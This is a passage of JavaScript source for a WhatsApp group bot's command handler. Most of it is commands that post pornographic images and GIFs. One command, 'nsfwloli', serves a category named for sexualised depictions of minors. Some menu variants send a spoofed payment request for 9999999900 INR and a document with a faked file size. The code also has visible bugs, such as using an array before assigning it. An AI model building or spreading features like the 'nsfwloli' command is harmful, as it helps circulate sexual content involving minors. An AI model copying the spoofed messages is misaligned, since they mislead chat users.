XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/hentai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/jahy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/manga.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/masturbation.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/neko2.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/nsfwloli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/orgy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/panties.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/tentacles.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'thighs':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/thighs.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await XeonBotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/gifs.json'))
var xeonyresultx = pickRandom(ahegaonsfw)
    await XeonBotInc.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)]
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/foot.json')
XeonBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					try {
ppuser = await XeonBotInc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppxeon = await getBuffer(ppuser)
XeonBotInc.sendMessage(from, { image: ppxeon, caption: profile, mentions: [bet]},{quoted:m})
break
case 'telestick': {
	if (m.isGroup) return XeonStickPrivate()
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replygcxeon(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replygcxeon('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				XeonBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replygcxeon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break

case 'setcmd': {
                if (!m.quoted) return replygcxeon('Reply Message!')
                if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
                if (!text) return replygcxeon(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcxeon('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcxeon(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcxeon(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcxeon('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                replygcxeon(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!XeonTheCreator) return XeonStickOwner()
                if (!m.quoted) return replygcxeon('Reply Message!')
                if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygcxeon('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygcxeon('Done!')
            }
            break
            case 'ss': case 'ssweb': {
if (!q) return replygcxeon(`Example ${prefix+command} link`)
await XeonStickWait()
let krt = await scp2.ssweb(q)
XeonBotInc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    XeonBotInc.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    replygcxeon(bibleChapter)
  } catch (error) {
    replygcxeon(`Error: ${error.message}`)
  }
  }
  break
  case'tr':{
  	if (!q) return replygcxeon(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       replygcxeon(result.text)
    } catch (e) {
        return replygcxeon(err)
    } 
    }
    break
  case 'dalle': {
  if (!text) return replygcxeon(`*This command generates images from text prompts*\n\n*𝙴xample usage*\n*${prefix + command} Beautiful anime girl*\n*${prefix + command} girl in pink dress*`)
  try {
  	replygcxeon('*Please wait, generating image...*')
    const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await XeonBotInc.sendMessage(m.chat, { image: imageBuffer }, {quoted: m})
    } else {
      throw '*Image generation failed*';
    }
  } catch {
    replygcxeon('*Oops! Something went wrong while generating images. Please try again later.*')
  }
  }
  break
  case 'translate':{
  	if (!q) return replygcxeon(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       replygcxeon(result.text)
    } catch (e) {
        return replygcxeon(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcxeon(quranSurah)

    if (json.data.recitation.full) {
      XeonBotInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcxeon(`Error: ${error.message}`)
  }
  }
  break
  case 'mediafire': {
  	if (!args[0]) return replygcxeon(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return replygcxeon(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
   ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
    XeonBotInc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
    case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return XeonStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    XeonBotInc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygcxeon(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygcxeon(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygcxeon(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      XeonBotInc.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      XeonBotInc.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygcxeon(`Total Features of ${botname} is ${xeonfeature()}`)
        break
            case 'menu':
            case 'help': {
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh = `
*HALO KAK, AKU ADALAH SYIBLI STICKER WHATSAPP*
*SILAHKAN JOIN KE SALURAN DAN GRUP WHATSAPP NYA*
*SEBELUM MENGGUNAKAN BOT INI*

*LINK SALURAN WHATSAPP :*
https://whatsapp.com/channel/0029VawlozV3mFYBBz1HJz45
*LINK GRUP WHATSAPP*
https://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD

ketik .allmenu untuk melihat menu nya.
bot ini masih dalam pengembangan mohon maaf jika masih ada yang error

┌ ◦ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴏᴛ: *.ᴀʟʟᴍᴇɴᴜ*
╰ ◦ ꜱʜᴏᴡ ᴍᴇɴᴜʟɪsᴛ ʙᴏᴛ: *.ᴍᴇɴᴜʟɪsᴛ*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
©SYIBLI STICKER WHATSAPP`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://8030.us.kg/file/cePyF1jMSTzV.jpg'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://8030.us.kg/file/cePyF1jMSTzV.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'allmenu': {
let xmenu_oh = `${allmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://8030.us.kg/file/cePyF1jMSTzV.jpg'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://8030.us.kg/file/cePyF1jMSTzV.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'ownermenu': {
let xmenu_oh = `${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
